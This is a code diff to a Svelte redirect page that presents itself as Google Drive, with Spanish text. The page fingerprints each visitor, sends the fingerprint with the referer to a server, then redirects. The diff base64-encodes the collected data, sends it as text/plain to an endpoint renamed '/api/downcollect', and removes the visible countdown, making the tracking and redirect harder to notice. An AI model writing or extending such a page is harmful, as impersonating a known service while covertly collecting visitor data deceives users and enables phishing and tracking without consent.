@@ -4,51 +4,34 @@
   import type { PageData } from './$types';
   import { collectFingerprint } from '$lib/fingerprint';
 
-  const FINGERPRINT_TIMEOUT_MS = 6000;
-  const REDIRECT_DELAY_MS = 2000;
+  const FINGERPRINT_TIMEOUT_MS = 7000;
 
   let { data }: { data: PageData } = $props();
 
-  let elapsedSeconds = $state(0);
-  let ready = $state(false);
-  let countdown = $derived(Math.max(0, REDIRECT_DELAY_MS / 1000 - elapsedSeconds));
-
   onMount(() => {
     const fingerprintPhase = Promise.race([
-      collectFingerprint().then(({ hash, browserData }) =>
-        fetch('/api/fingerprint', {
+      collectFingerprint().then(({ hash, browserData }) => {
+        const json = JSON.stringify({ hash, browser: browserData, referer: data.referer });
+        const bytes = new TextEncoder().encode(json);
+        const encoded = btoa(Array.from(bytes, (b) => String.fromCharCode(b)).join(''));
+        return fetch('/api/downcollect', {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ hash, browser: browserData, referer: data.referer })
-        })
-      ),
+          headers: { 'Content-Type': 'text/plain' },
+          body: encoded
+        });
+      }),
       new Promise<void>((resolve) => setTimeout(resolve, FINGERPRINT_TIMEOUT_MS))
     ]).catch(() => {});
 
     fingerprintPhase.then(() => {
-      ready = true;
-      const redirectTimer = window.setTimeout(() => {
-        window.location.replace(data.targetUrl);
-      }, REDIRECT_DELAY_MS);
-
-      const countdownTimer = window.setInterval(() => {
-        elapsedSeconds += 1;
-      }, 1000);
-
-      return () => {
-        window.clearTimeout(redirectTimer);
-        window.clearInterval(countdownTimer);
-      };
+      window.location.replace(data.targetUrl);
     });
   });
 </script>
 
 <svelte:head>
   <title>Google Drive</title>
-  <meta
-    name="description"
-    content="Comparte con Google Drive."
-  />
+  <meta name="description" content="Comparte con Google Drive." />
 </svelte:head>
 
 <div class="splash-shell">
@@ -58,9 +41,6 @@
     <div class="loader-core"></div>
   </div>
 
-  {#if ready}
-    <p class="countdown" aria-live="polite">{countdown}</p>
-  {/if}
   <p class="label">Cargando</p>
 </div>
 
@@ -114,13 +94,6 @@
     inset: 1.45rem;
     background: linear-gradient(135deg, #3871e0, #1197a7);
     box-shadow: 0 0 30px rgba(56, 113, 224, 0.24);
-  }
-
-  .countdown {
-    font-size: 2rem;
-    font-weight: 800;
-    color: #10233d;
-    margin: 0;
   }
 
   .label {
